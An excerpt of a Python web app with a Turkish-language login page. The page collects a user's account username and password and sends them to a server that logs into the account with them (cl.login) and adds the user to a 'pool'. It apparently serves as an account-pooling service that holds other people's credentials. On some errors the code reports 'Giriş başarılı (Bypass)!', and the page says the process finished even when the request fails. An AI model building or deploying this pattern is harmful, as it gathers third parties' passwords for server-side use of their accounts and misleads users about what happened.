...
def home():
    ...
    <body style="background:#0a0f1e;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:sans-serif;margin:0;">
        <div style="background:#161b2c;padding:40px;border-radius:24px;width:360px;text-align:center;border:1px solid #2d334a;">
            ...
            <p style="font-size:10px;color:#5c6b89;text-transform:uppercase;letter-spacing:2px;margin-bottom:30px;font-weight:bold;">V3.7 No-Wait Mode</p>
            ...
            <button onclick="login()" id="b" style="width:100%;padding:16px;background:#3b82f6;border:none;color:#fff;font-weight:bold;border-radius:12px;cursor:pointer;margin-top:15px;">DİREKT BAĞLAN</button>
        ...
        <script>
            async function login(){
                ...
                if(!u || !p) return;
                b.disabled=true; b.innerText="GİRİŞ YAPILIYOR...";
                try {
                    const r=await fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u,p})});
                    const d=await r.json();
                    m.innerText=d.msg;
                    if(d.status==="success") { b.innerText="TAMAMLANDI ✅"; b.style.background="#10b981"; }
                    else { b.disabled=false; b.innerText="YENİDEN DENE"; }
                } catch(e) { m.innerText="İşlem tamamlandı, Paneli kontrol et."; b.disabled=false; }
            }
        </script>
    </body>
    """)
...
def login():
    ...
    try:
        # Hızlı giriş denemesi
        cl.login(u, p)
        user.status = "AKTİF ✅"
        db.session.commit()
        return jsonify(status="success", msg="Havuza giriş yapıldı!")
    except Exception as e:
        err = str(e).lower()
        # Bildirim geliyorsa hataya bakma, AKTİF yap geç
        if "expecting value" in err or (hasattr(cl, 'user_id') and cl.user_id):
            user.status = "AKTİF ✅"
            db.session.commit()
            return jsonify(status="success", msg="Giriş başarılı (Bypass)!")
        
        user.status = f"Son Durum: {err[:30]}"
        db.session.commit()
